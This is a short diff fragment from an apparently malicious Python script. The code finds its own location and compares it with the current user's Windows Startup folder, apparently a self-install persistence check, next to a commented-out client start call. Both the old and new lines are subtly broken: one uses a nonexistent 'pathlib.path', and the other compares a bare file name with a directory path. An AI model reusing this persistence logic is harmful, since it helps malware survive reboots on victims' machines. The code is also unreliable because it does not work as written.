@@ -480,7 +480,7 @@ if __name__ == "__main__":
     #       client.start()
     #   except Exception as e:
     #       print(e)
-    loc = pathlib.path(sys.argv[0]).parent.resolve()
+    loc = os.path.basename(os.path.abspath(sys.argv[0]))
     dest = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
     dest2 = dest.replace("/", "\\")
     if not (loc == dest or loc == dest2):
